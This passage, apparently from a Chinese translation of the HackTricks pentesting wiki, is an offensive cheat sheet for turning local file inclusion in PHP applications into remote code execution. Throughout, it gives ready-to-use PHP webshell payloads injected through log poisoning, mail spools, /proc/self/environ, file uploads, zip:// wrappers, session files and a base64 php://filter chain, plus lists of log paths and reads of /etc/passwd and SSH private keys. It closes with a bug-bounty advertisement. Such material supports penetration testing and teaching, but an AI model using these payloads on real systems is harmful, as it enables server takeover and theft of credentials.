然后，为了泄露第一个字符，使用了过滤器**`dechunk`**以及其他过滤器，如**base64**或**rot13**，最后使用过滤器**convert.iconv.UCS-4.UCS-4LE**和**convert.iconv.UTF16.UTF-16BE**将其他字符放在开头并泄露它们。

**可能存在漏洞的函数**：`file_get_contents`，`readfile`，`finfo->file`，`getimagesize`，`md5_file`，`sha1_file`，`hash_file`，`file`，`parse_ini_file`，`copy`，`file_put_contents（仅限目标只读）`，`stream_get_contents`，`fgets`，`fread`，`fgetc`，`fgetcsv`，`fpassthru`，`fputs`

有关技术细节，请查看上述文章！

## LFI2RCE

### 远程文件包含

之前已经解释过，[**请点击此链接**](./#remote-file-inclusion)。

### 通过Apache/Nginx日志文件

如果Apache或Nginx服务器在包含函数中**存在LFI漏洞**，您可以尝试访问**`/var/log/apache2/access.log`或`/var/log/nginx/access.log`**，在**用户代理**或**GET参数**中设置一个php shell，例如**`<?php system($_GET['c']); ?>`**，然后包含该文件

{% hint style="warning" %}
请注意，如果您在shell中使用双引号而不是单引号，双引号将被修改为字符串"_**quote;**_"，PHP将在那里抛出错误，**不会执行任何其他操作**。

此外，请确保**正确编写有效载荷**，否则每次尝试加载日志文件时PHP都会出错，您将没有第二次机会。
{% endhint %}

这也可以在其他日志中完成，但要**小心**，日志中的代码可能已进行URL编码，这可能会破坏Shell。标头**authorisation "basic"**在Base64中包含"user:password"并在日志中解码。PHPShell可以插入此标头中。
其他可能的日志路径：
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### 通过电子邮件

**发送一封邮件**到内部账户（user@localhost），其中包含您的PHP有效载荷，如 `<?php echo system($_REQUEST["cmd"]); ?>`，并尝试通过路径 **`/var/mail/<USERNAME>`** 或 **`/var/spool/mail/<USERNAME>`** 包含到用户的邮件中

### 通过 /proc/\*/fd/\*

1. 上传大量的shell（例如：100个）
2. 使用 [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) 进行包含，其中 $PID 是进程的PID（可以通过暴力破解获得），$FD 是文件描述符（也可以通过暴力破解获得）

### 通过 /proc/self/environ

像日志文件一样，将有效载荷发送到 User-Agent，它将被反射到 /proc/self/environ 文件中
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### 通过上传

如果你可以上传一个文件，只需在其中注入shell负载（例如：`<?php system($_GET['c']); ?>`）。
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
为了保持文件的可读性，最好将注入内容压缩到图片/文档/PDF的元数据中。

### 通过上传ZIP文件

上传一个包含压缩的PHP shell的ZIP文件并访问：
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### 通过PHP会话

检查网站是否使用PHP会话（PHPSESSID）
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
在PHP中，这些会话被存储在`/var/lib/php5/sess_[PHPSESSID]`文件中。
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
将cookie设置为`<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
使用LFI（本地文件包含）来包含PHP会话文件

LFI（本地文件包含）是一种攻击技术，可以利用Web应用程序中的漏洞来包含本地文件。通过利用此漏洞，攻击者可以包含敏感文件，如PHP会话文件。

要利用LFI来包含PHP会话文件，可以使用以下步骤：

1. 确定目标网站是否存在LFI漏洞。可以通过尝试访问包含敏感文件的URL来测试。例如，尝试访问`http://example.com/index.php?page=/etc/passwd`，如果返回了包含敏感文件内容的响应，则表示存在LFI漏洞。

2. 确定PHP会话文件的位置。默认情况下，PHP会话文件存储在服务器的临时目录中，通常是`/tmp`或`/var/tmp`。可以通过查看PHP配置文件（如`php.ini`）或使用命令`phpinfo()`来获取该信息。

3. 构造LFI攻击的Payload。在URL中使用LFI漏洞时，可以通过将目标文件路径作为参数传递给受影响的页面来实现文件包含。例如，使用`http://example.com/index.php?page=/var/tmp/sess_123456`来包含PHP会话文件。

4. 利用LFI漏洞来包含PHP会话文件。将构造的Payload插入到受影响的页面中，以触发LFI漏洞并包含PHP会话文件。这样，攻击者就可以获取PHP会话文件中存储的敏感信息。

请注意，利用LFI漏洞进行攻击是非法的，并且仅在授权的渗透测试活动中使用。
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### 通过ssh

如果ssh处于活动状态，请检查正在使用的用户（/proc/self/status和/etc/passwd），并尝试访问**\<HOME>/.ssh/id\_rsa**

### 通过vsftpd日志

这个FTP服务器的日志存储在**/var/log/vsftpd.log**中。如果你有一个LFI并且可以访问一个暴露的vsftpd服务器，你可以尝试使用PHP负载设置用户名登录，然后使用LFI访问日志。

### 通过php base64过滤器（使用base64）

如[这篇文章](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64)所示，PHP base64过滤器只会忽略非base64字符。你可以利用这一点绕过文件扩展名检查：如果你提供以".php"结尾的base64，它会忽略"."并将"php"附加到base64后面。以下是一个示例负载：
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### 通过php过滤器（无需文件）

这个[**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)解释了你可以使用**php过滤器生成任意内容**作为输出。这基本上意味着你可以**生成任意的php代码**来包含，而无需将其写入文件中。

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### 通过分段错误

**上传**一个将被存储为**临时文件**在`/tmp`中，然后在**同一个请求**中，触发一个**分段错误**，然后**临时文件不会被删除**，你可以搜索它。

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### 通过Nginx临时文件存储

如果你发现了一个**本地文件包含**漏洞，并且**Nginx**在PHP之前运行，你可能可以使用以下技术获得RCE：

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### 通过PHP\_SESSION\_UPLOAD\_PROGRESS

如果你发现了一个**本地文件包含**漏洞，即使你**没有一个会话**，并且`session.auto_start`是`Off`。如果你在**多部分POST**数据中提供了**`PHP_SESSION_UPLOAD_PROGRESS`**，PHP将**为你启用会话**。你可以滥用这个来获得RCE：

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### 通过Windows临时文件上传

如果你发现了一个**本地文件包含**漏洞，并且服务器在**Windows**上运行，你可能会获得RCE：

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### 通过phpinfo()（file\_uploads = on）

如果你发现了一个**本地文件包含**漏洞，并且一个文件暴露了**phpinfo()**，并且file\_uploads = on，你可以获得RCE：

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### 通过compress.zlib + `PHP_STREAM_PREFER_STUDIO` + 路径泄露

如果你发现了一个**本地文件包含**漏洞，并且你**可以泄露临时文件的路径**，但是**服务器**正在**检查**要包含的文件是否有PHP标记，你可以尝试使用这个**竞争条件**来**绕过该检查**：

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### 通过永久等待 + 暴力破解

如果你可以滥用LFI来**上传临时文件**并使服务器**挂起**PHP执行，然后你可以在几个小时内**暴力破解文件名**以找到临时文件：

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### 致命错误

如果你包含了文件`/usr/bin/phar`，`/usr/bin/phar7`，`/usr/bin/phar.phar7`，`/usr/bin/phar.phar`。（你需要两次包含相同的文件来引发该错误）。

**我不知道这有什么用，但可能有用。**\
_即使引发了PHP致命错误，上传的PHP临时文件也会被删除。_

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## 参考资料

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
[PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof是所有加密漏洞赏金的家园。**

**即时获得奖励**\
HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞经过验证后，您将获得奖励。

**在web3渗透测试中积累经验**\
区块链协议和智能合约是新的互联网！掌握正在崛起的web3安全。

**成为web3黑客传奇**\
每次验证的漏洞都会获得声誉积分，并占领每周排行榜的榜首。

[**在HackenProof上注册**](https://hackenproof.com/register)开始从您的黑客行动中获利！

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得最新版本的PEASS或下载PDF格式的HackTricks吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) **或者** [**telegram 群组**](https://t.me/peass) **或者在 Twitter 上关注我** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
